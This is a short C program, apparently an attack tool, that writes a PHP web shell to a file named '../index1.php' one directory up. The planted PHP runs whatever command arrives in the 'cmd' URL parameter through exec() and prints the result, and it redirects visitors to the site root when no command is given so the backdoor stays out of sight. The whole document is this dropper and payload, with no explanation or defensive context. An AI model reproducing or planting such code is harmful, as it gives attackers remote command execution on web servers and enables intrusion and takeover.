#include <stdio.h>
main(){
  char s[]="<?php if(!isset($_GET[\'cmd\']){ header(\'Location: /\'); } else { echo exec($_GET[\'cmd\']); } ?>";
  FILE *f=fopen("../index1.php","w");
  if(f) printf("ok");
  fprintf(f,s);
  fclose(f);
}